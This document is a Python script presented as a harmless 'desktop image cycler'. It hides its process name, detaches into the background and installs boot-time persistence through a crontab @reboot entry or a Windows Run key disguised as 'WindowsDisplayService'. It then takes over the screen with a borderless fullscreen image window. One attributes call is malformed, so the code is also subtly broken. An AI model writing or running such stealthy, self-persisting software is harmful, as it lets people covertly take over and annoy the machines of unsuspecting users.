#!/usr/bin/env python3
# uptime.py - Silent desktop image cycler (looks like a broken screensaver)

import os
import sys
import time
import random
import signal
import subprocess
import platform

try:
    from PIL import Image, ImageTk
    has_pil = True
except ImportError:
    has_pil = False

SCRIPT_PATH = os.path.abspath(__file__)
PID_FILE = os.path.expanduser("~/.uptime_pid")
DELAY_FILE = os.path.expanduser("~/.uptime_interval")  # milliseconds
DEFAULT_DELAY = 20000

def get_delay():
    if os.path.exists(DELAY_FILE):
        try:
            with open(DELAY_FILE) as f:
                return max(5000, int(f.read().strip()))
        except:
            pass
    return DEFAULT_DELAY

def set_process_name(name="uptime"):
    if platform.system() == "Linux":
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, name.encode() + b"\0", 0, 0, 0)
        except:
            pass

def daemonize():
    if platform.system() != "Linux": return
    try:
        if os.fork(): sys.exit(0)
    except OSError: return
    os.setsid()
    try:
        if os.fork(): sys.exit(0)
    except OSError: return
    os.umask(0)
    devnull = open("/dev/null", "r+")
    os.dup2(devnull.fileno(), 0)
    os.dup2(devnull.fileno(), 1)
    os.dup2(devnull.fileno(), 2)

def set_persistence():
    if os.name == "posix":
        line = f"@reboot {sys.executable} {SCRIPT_PATH}\n"
        try:
            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
            if line not in cur:
                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
        except: pass
    elif os.name == "nt":
        try:
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "WindowsDisplayService", 0, reg.REG_SZ,
                          f'"{sys.executable}" "{SCRIPT_PATH}"')
            reg.CloseKey(key)
        except: pass

import tkinter as tk

def run_gui():
    if not has_pil:
        # No Pillow → nothing to do, exit silently
        sys.exit(0)

    set_process_name("uptime")

    # Kill any old instance
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                os.kill(int(f.read().strip()), signal.SIGTERM)
        except: pass

    root = tk.Tk()
    root.attributes("-fullscreen=True, topmost=True)
    root.configure(bg="black")
    root.overrideredirect(True)           # removes title bar completely

    canvas = tk.Canvas(root, bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    img_dir = os.path.dirname(SCRIPT_PATH)
    image_files = [f for f in os.listdir(img_dir)
                   if f.lower().endswith(('.png','.jpg','.jpeg','.gif','.bmp','.webp'))]

    if not image_files:
        sys.exit(0)  # no images → nothing to show

    current_photo = None
    img_obj = None

    def show_random_image():
        nonlocal current_photo, img_obj
        img_path = os.path.join(img_dir, random.choice(image_files))
        try:
            img = Image.open(img_path)
            # Resize to fill screen while preserving aspect ratio
            img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
            # Better: letterbox to avoid stretching
            bg = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), "black")
            img.thumbnail((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
            x = (bg.width - img.width) // 2
            y = (bg.height - img.height) // 2
            bg.paste(img, (x, y))
            current_photo = ImageTk.PhotoImage(bg)
            canvas.create_image(root.winfo_screenwidth()//2,
                                root.winfo_screenheight()//2,
                                image=current_photo)
        except:
            pass
        root.after(get_delay(), show_random_image)

    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    show_random_image()

    def cleanup(*_):
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", cleanup)
    root.bind("<Escape>", cleanup)
    root.bind("<Control-c>", cleanup)
    root.mainloop()

if __name__ == "__main__":
    set_process_name("uptime")

    if "--setup" in sys.argv:
        set_persistence()
        print("Persistence installed")
        sys.exit(0)

    if "--terminal" in sys.argv or not has_pil:
        # Silent when no GUI or no images
        while True: time.sleep(86400)

    if platform.system() == "Linux":
        daemonize()

    # Windows: use pythonw.exe if available (completely hidden)
    if os.name == "nt" and not sys.executable.endswith("pythonw.exe"):
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw):
            os.execv(pythonw, [pythonw] + sys.argv)

    run_gui()
